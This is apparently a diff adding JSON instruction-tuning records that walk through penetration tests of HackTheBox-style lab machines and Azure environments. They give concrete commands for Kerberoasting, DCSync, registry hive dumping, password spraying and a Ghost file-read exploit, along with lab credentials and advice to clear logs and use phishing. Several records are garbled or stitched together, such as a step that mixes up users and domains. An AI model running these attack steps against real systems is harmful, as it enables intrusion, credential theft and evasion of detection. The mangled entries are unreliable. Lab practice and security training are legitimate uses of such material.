+    "output": "Command: `nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.10.11.42`\nExplanation: This command performs service version detection on the specified open ports."
+  },
+  {
+    "instruction": "What should you do to identify subdomains related to the target?",
+    "input": "You want to discover any additional subdomains.",
+    "output": "Command: `ffuf -u http://10.10.11.42 -H 'Host: FUZZ.administrator.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac`\nExplanation: This command fuzzes for potential subdomains that might respond differently from the main domain."
+  },
+  {
+    "instruction": "How can you start an SMB session with the provided user credentials?",
+    "input": "You have the username and password for the Olivia account.",
+    "output": "Command: `netexec smb 10.10.11.42 -u olivia -p 'ichliebedich'`\nExplanation: This command authenticates against the SMB service using the provided user credentials."
+  },
+  {
+    "instruction": "What steps should you take after obtaining access as Olivia?",
+    "input": "You plan to escalate privileges using Bloodhound.",
+    "output": "Command: `bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns 10.10.11.42 --zip`\nExplanation: This command collects Bloodhound data to analyze user permissions and potential attack paths."
+  },
+  {
+    "instruction": "How do you exploit GenericAll permissions to reset another user's password?",
+    "input": "You have identified a user with GenericAll permissions.",
+    "output": "Command: `net rpc password 'michael' 'new_password' -U 'administrator.htb/olivia%ichliebedich'`\nExplanation: This command changes Michael's password using RPC to gain further access."
+  },
+  {
+    "instruction": "How can you perform a targeted Kerberoasting attack?",
+    "input": "You’ve reset the password for another user (Ethan) who has an SPN.",
+    "output": "Command: `targetedkerberoast.py -u ethan -d administrator.htb --password 'new_password'`\nExplanation: This command requests a TGS ticket for the SPN and extracts the hash for cracking."
+  },
+  {
+    "instruction": "What should you do after obtaining the password hash?",
+    "input": "You want to crack the Kerberoasting hash.",
+    "output": "Command: `hashcat <user_hash_file> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`\nExplanation: Use Hashcat to attempt to crack the obtained hash with a common password list."
+  },
+  {
+    "instruction": "How do you leverage the cracked password to access the system?",
+    "input": "You have cracked the hash for the user account.",
+    "output": "Command: `netexec winrm 10.10.11.42 -u ethan -p <cracked_password>`\nExplanation: This command connects to the target via WinRM using the newly cracked password."
+  },
+  {
+    "instruction": "Once you have a shell, how do you read the root flag?",
+    "input": "You are now authenticated as Administrator.",
+    "output": "Command: `cat C:\\Users\\Administrator\\Desktop\\root.txt`\nExplanation: This retrieves the root flag from the Administrator's Desktop, indicating successful exploitation of the box."
+  }
+{
+    "instruction": "How do you start the penetration test on the LinkVortex box?",
+    "input": "You need to identify open ports on the target.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.47`\nExplanation: This command scans all TCP ports quickly to identify which ones are open on the LinkVortex box."
+  },
+  {
+    "instruction": "What command do you use to gather detailed service information from open ports?",
+    "input": "You want to find version details of the services running on the identified open ports.",
+    "output": "Command: `nmap -p 22,80 -sCV 10.10.11.47`\nExplanation: This command performs service version detection on the specified open ports to reveal detailed information."
+  },
+  {
+    "instruction": "How do you check for subdomains related to LinkVortex?",
+    "input": "You want to discover additional subdomains.",
+    "output": "Command: `ffuf -u http://10.10.11.47 -H 'Host: FUZZ.linkvortex.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac`\nExplanation: This command fuzzes for potential subdomains that might respond differently from the main domain."
+  },
+  {
+    "instruction": "What should you do to explore the main website at port 80?",
+    "input": "You found a web application running on the target.",
+    "output": "Command: `curl http://10.10.11.47`\nExplanation: This command retrieves the homepage of the LinkVortex web application for further analysis."
+  },
+  {
+    "instruction": "What steps should you take to investigate the exposed Git repository?",
+    "input": "You want to collect the Git repository for analysis.",
+    "output": "Command: `git-dumper http://dev.linkvortex.htb source`\nExplanation: This command collects the contents of the exposed Git repository."
+  },
+  {
+    "instruction": "How can you exploit the file read vulnerability (CVE-2023-40028) in Ghost?",
+    "input": "You have identified the vulnerable endpoint that allows file uploads.",
+    "output": "Command: `curl -F 'importfile=@poc.zip' -b 'ghost-admin-api-session=<your_session_cookie>' http://linkvortex.htb/ghost/api/admin/db`\nExplanation: This command uploads a zip file containing a symbolic link to read sensitive files."
+  },
+  {
+    "instruction": "What should you do after successfully exploiting the file read vulnerability?",
+    "input": "You now want to retrieve a sensitive file.",
+    "output": "Command: `curl -b 'ghost-admin-api-session=<your_session_cookie>' http://linkvortex.htb/content/images/<filename>`\nExplanation: This command accesses the uploaded symbolic link to read files on the server."
+  },
+  {
+    "instruction": "How do you establish a shell as bob after obtaining access?",
+    "input": "You have obtained the SMTP credentials for the bob user.",
+    "output": "Command: `sshpass -p 'fibber-talented-worth' ssh bob@linkvortex.htb`\nExplanation: This command allows you to connect to the server as the bob user using the cracked password."
+  },
+  {
+    "instruction": "What steps should you take after gaining shell access as bob?",
+    "input": "You want to enumerate user groups for further privileges.",
+    "output": "Command: `sudo -l`\nExplanation: This command lists the user's sudo privileges, allowing you to see which commands you can run as root."
+  },
+  {
+    "instruction": "How do you escalate to root from bob's account?",
+    "input": "You found a script that can be run as root.",
+    "output": "Command: `sudo /path/to/vulnerable/script.sh`\nExplanation: This command runs the vulnerable script with root privileges, giving you elevated access."
+  },
+  {
+    "instruction": "How do you retrieve the root flag after gaining elevated access?",
+    "input": "You are now operating as root.",
+    "output": "Command: `cat /root/root.txt`\nExplanation: This command retrieves the root flag from the administrator’s home directory, indicating successful exploitation of the box."
+  }
+ {
+    "instruction": "How do you start the penetration test on the Certified box?",
+    "input": "You have the target IP address.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.41`\nExplanation: This command scans all TCP ports rapidly to identify which ones are open on the Certified box."
+  },
+  {
+    "instruction": "What command do you use to gather detailed service information from the open ports?",
+    "input": "You want to find out about the services running on the identified open ports.",
+    "output": "Command: `nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.10.11.41`\nExplanation: This command performs service version detection on the specified open ports to reveal detailed service information."
+  },
+  {
+    "instruction": "How can you check for subdomains related to Certified?",
+    "input": "You want to discover additional subdomains.",
+    "output": "Command: `ffuf -u http://10.10.11.41 -H 'Host: FUZZ.certified.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac`\nExplanation: This command fuzzes for potential subdomains that might respond differently from the main domain."
+  },
+  {
+    "instruction": "How do you verify the initial user credentials?",
+    "input": "You have the username and password for Judith Mader.",
+    "output": "Command: `netexec smb certified.htb -u judith.mader -p judith09`\nExplanation: This command authenticates against the SMB service using the provided user credentials to check if they work."
+  },
+  {
+    "instruction": "What should you do after obtaining access as Judith?",
+    "input": "You want to enumerate permissions using Bloodhound.",
+    "output": "Command: `bloodhound-python -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip`\nExplanation: This command collects Bloodhound data to analyze user permissions and potential attack paths."
+  },
+  {
+    "instruction": "How can you exploit the WriteOwner privilege to reset another user's password?",
+    "input": "You have identified a user who has WriteOwner permissions.",
+    "output": "Command: `net rpc password 'michael' 'new_password' -U 'administrator.htb/olivia%judith09'`\nExplanation: This command resets Michael's password to gain further access."
+  },
+  {
+    "instruction": "How do you retrieve NT hashes for users using DCSync?",
+    "input": "You have the necessary permissions to perform a DCSync.",
+    "output": "Command: `secretsdump.py <username>:<password>@<target>`\nExplanation: Use this command to dump NT hashes for users from the domain controller."
+  },
+  {
+    "instruction": "What command should you run after obtaining a hash from DCSync?",
+    "input": "You want to crack the NTLM hash.",
+    "output": "Command: `hashcat <hash_file> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`\nExplanation: Use Hashcat to attempt to crack the NTLM hash obtained from the DCSync."
+  },
+  {
+    "instruction": "How do you authenticate as the Administrator after cracking the password?",
+    "input": "You have the cracked Administrator password.",
+    "output": "Command: `evil-winrm -i certified.htb -u Administrator -p <cracked_password>`\nExplanation: This command connects to the target via WinRM using the cracked Administrator password."
+  },
+  {
+    "instruction": "How do you retrieve the root flag after gaining access as Administrator?",
+    "input": "You are now operating as the Administrator.",
+    "output": "Command: `cat C:\\Users\\Administrator\\Desktop\\root.txt`\nExplanation: This command retrieves the root flag from the Administrator's desktop, confirming successful exploitation of the box."
+  }
+{
+    "section": "Initial Reconnaissance",
+    "overview": "Begin by gathering information about the target system.",
+    "steps": [
+      {
+        "task": "Perform a network scan",
+        "command": "nmap -p- <target_ip>",
+        "purpose": "Identify open ports and services running on the target."
+      },
+      {
+        "task": "Run OS-specific scans",
+        "command": "nmap -sCV -p <open_ports> <target_ip>",
+        "purpose": "Gather detailed version information about the services running."
+      },
+      {
+        "task": "Check for subdomains",
+        "command": "ffuf -u http://<target> -H 'Host: FUZZ.<domain>' -w <wordlist>",
+        "purpose": "Discover any additional attack surfaces."
+      }
+    ],
+    "considerations": [
+      "Evaluate discovered services for known vulnerabilities.",
+      "Look for unauthorized subdomains or misconfigurations."
+    ]
+  },
+  {
+    "section": "Service Enumeration",
+    "overview": "Once services are identified, enumerate them for further details.",
+    "steps": [
+      {
+        "task": "Check for shared resources (SMB, FTP, etc.)",
+        "command": "net exec smb <target_ip> --shares",
+        "purpose": "Find shared directories that may have sensitive information."
+      },
+      {
+        "task": "Use specific tools for service enumeration",
+        "tool": "BloodHound",
+        "purpose": "Map out relationships and permissions in Active Directory environments."
+      },
+      {
+        "task": "Look for configuration files",
+        "command": "curl http://<target>/<path_to_config>",
+        "purpose": "Extract credentials or sensitive data from configuration files."
+      }
+    ],
+    "considerations": [
+      "Verify access to sensitive files is logged.",
+      "Determine if access requires elevated privileges."
+    ]
+  },
+  {
+    "section": "Credential Harvesting",
+    "overview": "Use discovered credentials to gain access to the system.",
+    "steps": [
+      {
+        "task": "Test credentials",
+        "command": "netexec smb <target_ip> -u <username> -p <password>",
+        "purpose": "Authenticate against services using collected credentials."
+      },
+      {
+        "task": "Gather sensitive files via exploitation",
+        "example": "Exploit a file read vulnerability to access sensitive files.",
+        "purpose": "Directly obtain credentials or useful information."
+      },
+      {
+        "task": "Utilize credential dumps",
+        "command": "secretsdump.py <credentials>",
+        "purpose": "Extract hashes or sensitive data from a compromised system."
+      }
+    ],
+    "considerations": [
+      "If password attacks fail, consider alternative routes such as social engineering.",
+      "Monitor for account lockouts or alerts."
+    ]
+  },
+  {
+    "section": "Privilege Escalation",
+    "overview": "Once access is gained, attempt to escalate privileges.",
+    "steps": [
+      {
+        "task": "Identify local users and groups",
+        "command": "whoami /all",
+        "purpose": "Understand the current user's permissions and group memberships."
+      },
+      {
+        "task": "Utilize privilege escalation scripts",
+        "example": "Look for scripts that run with elevated privileges.",
+        "purpose": "Access sensitive information or services."
+      },
+      {
+        "task": "Perform DCSync or similar techniques",
+        "note": "If DCSync is not available, use alternative methods like Kerberoasting.",
+        "purpose": " Utilize any available means to access sensitive credentials."
+      }
+    ],
+    "considerations": [
+      "Check the effectiveness of local vulnerabilities if network methods fail.",
+      "Document any unsuccessful attempts to inform future exploration."
+    ]
+  },
+  {
+    "section": "Post-Exploitation",
+    "overview": "After obtaining root access, gather any final flags and metas.",
+    "steps": [
+      {
+        "task": "Retrieve flags",
+        "command": "cat /root/root.txt",
+        "purpose": "Confirm successful exploitation by collecting endpoint flags."
+      },
+      {
+        "task": "Document findings",
+        "purpose": "Record all techniques used and data acquired for post-engagement reporting."
+      },
+      {
+        "task": "Cover tracks if necessary",
+        "command": "Clear logs or other traces of your activities.",
+        "purpose": "Minimize detection by system administrators."
+      }
+    ],
+    "considerations": [
+      "Ensure all actions taken are documented for analysis.",
+      "Evaluate potential data leakage or exposure during the breaching process."
+    ]
+  },
+  {
+    "section": "Scenario Analysis",
+    "overview": "If a typical pathway fails, derive conclusions and alternate strategies.",
+    "examples": [
+      {
+        "scenario": "DCSync fails",
+        "response": [
+          "Look for other areas of privilege escalation.",
+          "Consider social engineering or phishing for credentials."
+        ]
+      },
+      {
+        "scenario": "No weak passwords available",
+        "response": [
+          "Look for sensitive data in configuration files or backups.",
+          "Attempt exploitation through known vulnerabilities in services running."
+        ]
+      }
+    ]
+{
+    "section": "Initial Reconnaissance",
+    "overview": "Gather initial information about the Azure environment.",
+    "steps": [
+      {
+        "instruction": "Check Azure subscriptions and resources.",
+        "input": "You may have access to Azure CLI or PowerShell.",
+        "output": "Command: `az account list`\nPurpose: Lists all Azure subscriptions available to the current account."
+      },
+      {
+        "instruction": "Identify active Azure services.",
+        "input": "You want to audit available resources in a subscription.",
+        "output": "Command: `az resource list --output table`\nPurpose: Lists all resources in the current subscription, formatted as a table."
+      }
+    ],
+    "considerations": [
+      "Note any managed identities linked to resources.",
+      "Look for Azure Active Directory (AAD) information to identify users and groups."
+    ]
+  },
+  {
+    "section": "Enumeration",
+    "overview": "Enumerate the Azure environment to find potential attack vectors.",
+    "steps": [
+      {
+        "instruction": "List Active Directory users.",
+        "input": "You can use Azure CLI to fetch user data.",
+        "output": "Command: `az ad user list --output table`\nPurpose: Enumerates all AAD users to find potential targets."
+      },
+      {
+        "instruction": "Gather group memberships.",
+        "input": "You have identified users and want to check their group memberships.",
+        "output": "Command: `az ad user show --id <user_id>`\nPurpose: Displays detailed information about a specific user, including group memberships."
+      },
+      {
+        "instruction": "Identify role assignments.",
+        "input": "Audit role-based access for resources.",
+        "output": "Command: `az role assignment list --assignee <user_email>`\nPurpose: Lists all role assignments associated with a given user."
+      }
+    ],
+    "considerations": [
+      "Check for users with elevated permissions such as Owner or Contributor roles.",
+      "Assess access to critical resources like storage accounts and VMs."
+    ]
+  },
+  {
+    "section": "Credential Harvesting",
+    "overview": "Use discovered credentials to gain access.",
+    "steps": [
+      {
+        "instruction": "Authenticate using service principals.",
+        "input": "You have identified service principals and their credentials.",
+        "output": "Command: `az login --service-principal -u <app_id> -p <password> --tenant <tenant_id>`\nPurpose: Authenticates using a service principal to access resources."
+      },
+      {
+        "instruction": "Use password spraying against AAD users.",
+        "input": "Identify a set of common passwords to cycle through.",
+        "output": "Command: Use a scripting tool (e.g., PowerShell) to attempt logins with common passwords.\nPurpose: Attempt to gain access through weak passwords."
+      }
+    ],
+    "considerations": [
+      "Monitor for multi-factor authentication (MFA) requirements, which may block access.",
+      "Look for accounts that do not have MFA enabled."
+    ]
+  },
+  {
+    "section": "Privilege Escalation",
+    "overview": "Once access is gained, attempt to escalate privileges.",
+    "steps": [
+      {
+        "instruction": "Identify misconfigured role assignments.",
+        "input": "Audit role assignments within Azure.",
+        "output": "Command: `az role assignment list --output json`\nPurpose: Analyzes role assignments for possible misconfigurations that can be exploited."
+      },
+      {
+        "instruction": "Attempt DCOM/Remote WMI exploits.",
+        "input": "You have access to a VM and want to escalate privileges.",
+        "output": "Use PowerShell to invoke `Invoke-Command` remotely on the VM.\nPurpose: Execute commands with higher privileges."
+      },
+      {
+        "instruction": "Utilize Azure Logic Apps or Functions with Additionally Privileged Access.",
+        "input": "Finding Logic Apps that allow for outbound connections.",
+        "output": "Command: Create a new Logic App and trigger it to execute commands on behalf of a higher-privileged user.\nPurpose: Leverage Azure’s automation capabilities for privilege escalation."
+      }
+    ],
+    "considerations": [
+      "Investigate if any functions or logic apps can be manipulated for privilege escalations.",
+      "Check for excessive permissions granted to applications or users."
+    ]
+  },
+  {
+    "section": "Post-Exploitation",
+    "overview": "After obtaining elevated access, gather any final flags and sensitive information.",
+    "steps": [
+      {
+        "instruction": "Retrieve environment variables.",
+        "input": "You have access to Azure functions or web apps.",
+        "output": "Command: `az webapp config appsettings list --name <app_name> --resource-group <resource_group>`\nPurpose: Lists environment variables that may contain sensitive information like connection strings."
+      },
+      {
+        "instruction": "Verify access to sensitive data stores.",
+        "input": "You want to check if access to key vaults is granted.",
+        "output": "Command: `az keyvault list --query '[].{Name:name, ResourceGroup:resourceGroup}'`\nPurpose: Lists all Key Vaults available to the authenticated user."
+      },
+      {
+        "instruction": "Document findings.",
+        "input": "After exploiting, document all findings.",
+        "output": "Command: Use a markdown or text editor to create a report detailing all vulnerabilities identified, techniques used, and data accessed.\nPurpose: Producing a report to communicate findings."
+      }
+    ],
+    "considerations": [
+      "Ensure all actions taken are documented for analysis.",
+      "Monitor for potential data leakage or exposure during the exploitation process."
+    ]
+  },
+  {
+    "section": "Scenario Analysis",
+    "overview": "If a typical pathway fails, derive conclusions and alternative strategies.",
+    "examples": [
+      {
+        "scenario": "Privilege escalation fails using standard methods.",
+        "response": [
+          "Investigate alternative methods such as lateral movement to other services.",
+          "Look for any misconfigurations in Azure services that can be exploited."
+        ]
+      },
+      {
+        "scenario": "Credential harvesting does not yield results.",
+        "response": [
+          "Consider social engineering techniques for acquiring credentials.",
+          "Explore potential shared secrets in configurations for automation tools."
+        ]
+      }
+    ]
+  }
+
+  }
+{
+  "section": "Initial Reconnaissance",
+  "overview": "Gather initial information about the Azure environment.",
+  "steps": [
+    {
+      "instruction": "Check Azure subscriptions and resources.",
+      "input": "You have access to Azure CLI.",
+      "output": "Command: `az account list`\nPurpose: Lists all Azure subscriptions available to the current account."
+    },
+    {
+      "instruction": "Find existing Azure resources.",
+      "input": "You want to audit available resources in a subscription.",
+      "output": "Command: `az resource list --output table`\nPurpose: Lists resources in the current subscription."
+    },
+    {
+      "instruction": "Gather Active Directory information.",
+      "input": "You need users and groups.",
+      "output": "Command: `az ad user list --output table`\nPurpose: Enumerates all AAD users for reconnaissance."
+    }
+  ],
+  "considerations": [
+    "Evaluate discovered services for known vulnerabilities.",
+    "Look for unauthorized subdomains or misconfigurations."
+  ]
+}
+{
+  "section": "Service Enumeration",
+  "overview": "Identify services and their configurations in the Azure environment.",
+  "steps": [
+    {
+      "instruction": "List Active Directory users.",
+      "input": "Using Azure CLI for user enumeration.",
+      "output": "Command: `az ad user show --id <user_id>`\nPurpose: Provides detailed user information."
+    },
+    {
+      "instruction": "Discover role assignments.",
+      "input": "Assess access rights on resources.",
+      "output": "Command: `az role assignment list --assignee <user_email>`\nPurpose: Lists roles assigned to a specific user."
+    },
+    {
+      "instruction": "Query Azure Function Apps and Logic Apps.",
+      "input": "Identify potential attack vectors.",
+      "output": "Command: `az functionapp list --output table`\nPurpose: Enumerate all Azure Functions for exploitation opportunities."
+    }
+  ],
+  "considerations": [
+    "Check for policies that might affect access control.",
+    "Analyze resource configurations for sensitive data exposure."
+  ]
+}
+{
+  "section": "Credential Harvesting",
+  "overview": "Use discovered credentials to gain access to services.",
+  "steps": [
+    {
+      "instruction": "Authenticate using service principals.",
+      "input": "You have identified service principal credentials.",
+      "output": "Command: `az login --service-principal -u <app_id> -p <password> --tenant <tenant_id>`\nPurpose: Authenticate and gain access to Azure resources."
+    },
+    {
+      "instruction": "Enumerate shared resources.",
+      "input": "Access to shared resources on a particular service.",
+      "output": "Command: `az storage share list --account-name <account_name>`\nPurpose: List shared storage resources."
+    },
+    {
+      "instruction": "Implement password spraying on AAD users.",
+      "input": "Evaluate common passwords against users.",
+      "output": "Command: Use a PowerShell script or locator tool to cycle through passwords.\nPurpose: Gain unauthorized access through weak passwords."
+    }
+  ],
+  "considerations": [
+    "Be aware of account lockouts or alerts.",
+    "Consider the security implications of successful authentication."
+  ]
+}
+{
+  "section": "Privilege Escalation",
+  "overview": "Escalate privileges once access is gained.",
+  "steps": [
+    {
+      "instruction": "Identify local roles and permissions.",
+      "input": "Currently authenticated as a low-priv user.",
+      "output": "Command: `az role assignment list --output json`\nPurpose: Assess roles assigned to the user and find potential escalation paths."
+    },
+    {
+      "instruction": "Exploit misconfigured role assignments.",
+      "input": "Find users with excessive permissions.",
+      "output": "Command: `az ad group member list --group <group_name>`\nPurpose: Identify users with abnormal permissions for further exploitation."
+    },
+    {
+      "instruction": "Leverage Azure Logic Apps.",
+      "input": "Find logic apps that can execute commands.",
+      "output": "Command: Review Azure Logic Apps setups for improperly secured APIs.\nPurpose: Elevate permissions through orchestrated automation."
+    }
+  ],
+  "considerations": [
+    "Monitor for changes to privileges after any attempt.",
+    "Analyze security logs for unusual behavior."
+  ]
+}
+{
+  "section": "Post-Exploitation",
+  "overview": "Gather flags and sensitive information after gaining elevated access.",
+  "steps": [
+    {
+      "instruction": "Retrieve user credentials from Azure Key Vault.",
+      "input": "You may have permissions to access the key vault.",
+      "output": "Command: `az keyvault secret list --vault-name <vault_name>`\nPurpose: Enumerate available secrets in the key vault for sensitive data."
+    },
+    {
+      "instruction": "Explore settings in App Service Environments.",
+      "input": "Check for environment variables with sensitive data.",
+      "output": "Command: `az webapp config appsettings list --name <app_name> --resource-group <resource_group>`\nPurpose: Lists the appsettings for Azure web apps."
+    },
+    {
+      "instruction": "Document findings and retain evidence.",
+      "input": "Compile a report for further analysis.",
+      "output": "Command: Use documentation tools to outline all gathered information and vulnerabilities.\nPurpose: Produce a report for remediation and analysis."
+    }
+  ],
+  "considerations": [
+    "Ensure all actions are documented for future analysis.",
+    "Review potential data exfiltration methods."
+  ]
+}
+{
+  "section": "Lateral Movement",
+  "overview": "Move laterally across the Azure infrastructure to access additional resources.",
+  "steps": [
+    {
+      "instruction": "Identify network shares on different VMs.",
+      "input": "You've gathered credentials for accessing other machines.",
+      "output": "Command: `az vm list --output table`\nPurpose: Lists all VMs to locate resources for lateral movement."
+    },
+    {
+      "instruction": "Check for device tokens for existing sessions.",
+      "input": "Analyze token storage that may allow sessions to escalate.",
+      "output": "Command: Use relevant scripts to parse and analyze stored tokens in Azure.\nPurpose: Leverage existing sessions for lateral access."
+    },
+    {
+      "instruction": "Use Azure Bastion for secure access.",
+      "input": "You can use Azure Bastion to connect to other VMs securely.",
+      "output": "Command: Utilize the Azure portal to connect to a VM through Bastion.\nPurpose: Safely browse through the Azure network."
+    }
+  ],
+  "considerations": [
+    "Maintain awareness of security groups that may restrict movement.",
+    "Be cautious of alert boundaries that may indicate suspicious activity."
+  ]
+}
+{
+  "section": "Service Exploration",
+  "overview": "Explore Azure services for potential vulnerabilities.",
+  "steps": [
+    {
+      "instruction": "Gather Azure App Service configurations.",
+      "input": "You've accessed services running in App Service.",
+      "output": "Command: `az webapp show --name <app_name> --resource-group <resource_group>`\nPurpose: Retrieve configuration details that may expose vulnerabilities."
+    },
+    {
+      "instruction": "Audit Azure Functions for potential exploits.",
+      "input": "You want to ensure that no unauthorized triggers are set.",
+      "output": "Command: `az functionapp show --name <function_name> --resource-group <resource_group>`\nPurpose: Identify configurations that may not be secure."
+    },
+    {
+      "instruction": "Review Azure Storage accounts for misconfigurations.",
+      "input": "Audit storage accounts for public accessibility.",
+      "output": "Command: `az storage account list --output table`\nPurpose: List storage accounts and check their public access settings."
+    }
+  ],
+  "considerations": [
+    "Take inventory of all resource configurations.",
+    "Look for services that might allow unauthorized access."
+  ]
+}
+{
+  "section": "Threat Modeling",
+  "overview": "Assess the Azure environment for potential threats and vulnerabilities.",
+  "steps": [
+    {
+      "instruction": "Conduct a threat analysis on identified resources.",
+      "input": "You want to classify risks associated with each resource.",
+      "output": "Command: Document findings in a threat model format.\nPurpose: Provide a visual representation of threat vectors."
+    },
+    {
+      "instruction": "Evaluate security controls in place.",
+      "input": "Review Azure policies and security settings.",
+      "output": "Command: `az policy definition list --output table`\nPurpose: Identify existing policies that protect resources from threats."
+    },
+    {
+      "instruction": "Map the attack surface.",
+      "input": "Identify entry and exit points of potential attacks.",
+      "output": "Command: Create a comprehensive map of services connected and exposed.\nPurpose: Visual tool for assessing potential threats."
+    }
+  ],
+  "considerations": [
+    "Ensure continuous monitoring to adapt to emerging threats.",
+    "Review threat intelligence for current vulnerabilities in Azure."
+  ]
+}
+{
+  "section": "Reporting Findings",
+  "overview": "Compile and document findings thoroughly for stakeholders.",
+  "steps": [
+    {
+      "instruction": "Structure findings in a report format.",
+      "input": "Document all vulnerabilities and methods used.",
+      "output": "Command: Use markdown or documentation software for structuring the report.\nPurpose: Create an easily digestible format for stakeholders."
+    },
+    {
+      "instruction": "Summarize priority vulnerabilities.",
+      "input": "Identify the most critical findings.",
+      "output": "Command: List out top 5 vulnerabilities with risk ratings.\nPurpose: Help stakeholders focus on immediate risks."
+    },
+    {
+      "instruction": "Propose remediation strategies.",
+      "input": "Follow-up on findings with actionable steps.",
+      "output": "Command: Create a recommendations section in the report.\nPurpose: Ensure clear paths for remediation of issues."
+    }
+  ],
+  "considerations": [
+    "Avoid technical jargon when presenting to non-technical stakeholders.",
+    "Ensure that all findings are backed by evidence."
+  ]
+}
+{
+  "section": "Continuous Learning and Improvement",
+  "overview": "Focus on improving future penetration tests by analyzing past performance.",
+  "steps": [
+    {
+      "instruction": "Conduct a retrospective of the pentest.",
+      "input": "Analyze what techniques worked and what didn't.",
+      "output": "Command: Host a meeting with stakeholders to discuss the outcomes.\nPurpose: Foster a learning environment."
+    },
+    {
+      "instruction": "Update methodologies based on findings.",
+      "input": "Incorporate lessons learned into future strategies.",
+      "output": "Command: Revise training materials to better inform future team members.\nPurpose: Enhance the skill set of the team for future engagements."
+    },
+    {
+      "instruction": "Stay informed on new vulnerabilities.",
+      "input": "Regularly check for updates in Azure security.",
+      "output": "Command: Subscribe to security feeds and follow Azure security blogs.\nPurpose: Ensure the team remains ahead of potential threats."
+    }
+  ],
+  "considerations": [
+    "Promote a culture of learning within the team.",
+    "Document all lessons learned for future reference."
+  ]
+}
+ {
+    "section": "Initial Reconnaissance",
+    "overview": "Identify open ports and services on the target.",
+    "steps": [
+      {
+        "instruction": "Perform a full port scan.",
+        "input": "nmap command to find open ports.",
+        "output": "Command: `nmap -p- --min-rate 10000 10.10.11.35`\nPurpose: Identifies all open TCP ports on the target."
+      },
+      {
+        "instruction": "Check specific service versions.",
+        "input": "Use Nmap to get service versions.",
+        "output": "Command: `nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.10.11.35`\nPurpose: Provides detailed information about services running on the open ports."
+      }
+    ],
+    "considerations": [
+      "Identify which ports are critical for further exploitation.",
+      "Look out for default services commonly found on Windows servers."
+    ]
+  },
+  {
+    "section": "Share Enumeration",
+    "overview": "Enumerate SMB shares for sensitive information.",
+    "steps": [
+      {
+        "instruction": "Connect to SMB shares with guest credentials.",
+        "input": "Use netexec to enumerate shares.",
+        "output": "Command: `netexec smb CICADA-DC --shares`\nPurpose: To identify accessible shares on the target."
+      },
+      {
+        "instruction": "Identify specific files within HR share.",
+        "input": "Access the HR share to find potentially sensitive documents.",
+        "output": "Command: `smbclient -U guest //10.10.11.35/HR`\nPurpose: Enumerate files in a specific share that may hold valuable information."
+      }
+    ],
+    "considerations": [
+      "Look for configuration files or notes that may contain credentials.",
+      "Identify read/write permissions for shares to leverage further access."
+    ]
+  },
+  {
+    "section": "Credential Harvesting",
+    "overview": "Obtain valid credentials for further access.",
+    "steps": [
+      {
+        "instruction": "Retrieve usernames with RID cycling.",
+        "input": "Run a brute-force attack to collect usernames.",
+        "output": "Command: `netexec smb CICADA-DC -u guest --rid-brute`\nPurpose: Enumerates domain users for valid accounts."
+      },
+      {
+        "instruction": "Use discovered passwords in a password spray attack.",
+        "input": "Attempt to log in using a known password.",
+        "output": "Command: `netexec smb CICADA-DC -u <user> -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success`\nPurpose: To find an active user account."
+      }
+    ],
+    "considerations": [
+      "Ensure you are not triggering account lockouts during password spraying.",
+      "Monitor for successful authentication to determine potential access paths."
+    ]
+  },
+  {
+    "section": "Privileged Access",
+    "overview": "Gain higher privileges through exploiting user credentials.",
+    "steps": [
+      {
+        "instruction": "Access LDAP with valid credentials.",
+        "input": "Use the authenticated user to enumerate more information.",
+        "output": "Command: `netexec ldap CICADA-DC -u <user> -p '<password>' --users`\nPurpose: Enumerate users and potential sensitive attributes."
+      },
+      {
+        "instruction": "Check access to shares with higher permissions.",
+        "input": "Determine if you can access restricted shares.",
+        "output": "Command: `netexec smb CICADA-DC -u <user> -p '<password>' --shares`\nPurpose: Identify any sensitive shares available to the user."
+      }
+    ],
+    "considerations": [
+      "Determine if the user has any elevated roles or access privileges.",
+      "Evaluate the effectiveness of the explored shares for further escalation."
+    ]
+  },
+  {
+    "section": "Data Extraction",
+    "overview": "Extract sensitive data from the target environment.",
+    "steps": [
+      {
+        "instruction": "Download registry hives using SeBackupPrivilege.",
+        "input": "If the user has backup privileges, utilize these for access.",
+        "output": "Command: `reg save hklm\system system.save`\nPurpose: Extract relevant registry data to analyze for credentials."
+      },
+      {
+        "instruction": "Use secretsdump to extract SMB/NT hashes.",
+        "input": "Using the dumped registry hives to get NTLM hashes.",
+        "output": "Command: `secretsdump.py -system system.save -sam sam.save LOCAL`\nPurpose: Dump hashes from registry hives for potential password cracking."
+      }
+    ],
+    "considerations": [
+      "Assess the security implications of the data you extract.",
+      "Plan how to securely store any credentials or sensitive information obtained."
+    ]
+  },
+  {
+    "section": "Post-exploitation and Cleanup",
+    "overview": "Analyze obtained data and ensure no traces are left on the target.",
+    "steps": [
+      {
+        "instruction": "Analyze NTLM hashes for user access.",
+        "input": "Check dump results for usable credentials.",
+        "output": "Command: Analyze the output of secretsdump for potential login credentials.\nPurpose: Identify users with common/weak passwords."
+      },
+      {
+        "instruction": "Ensure all used tools and files are cleaned from the system.",
+        "input": "Remove any scripts or files that were temporarily used.",
+        "output": "Command: Execute cleanup scripts to erase traces of the hacking activity.\nPurpose: Minimize detection risks post-access."
+      }
+    ],
+    "considerations": [
+      "Reflect on the overall penetration testing process for improvements.",
+      "Maintain a record of tools and techniques for future engagements."
+    ]
+  }
+{
+    "section": "Initial Reconnaissance",
+    "overview": "Discover open ports and services on the target.",
+    "steps": [
+      {
+        "instruction": "Perform a full port scan.",
+        "input": "nmap command to identify active services.",
+        "output": "Command: `nmap -p- --min-rate 10000 10.10.11.20`\nPurpose: Identifies all open TCP ports."
+      },
+      {
+        "instruction": "Scan for specific services and their versions.",
+        "input": "Refine the scan to critical ports.",
+        "output": "Command: `nmap -p 22,80 -sCV 10.10.11.20`\nPurpose: Provides detailed versions of services, confirming server details."
+      }
+    ],
+    "considerations": [
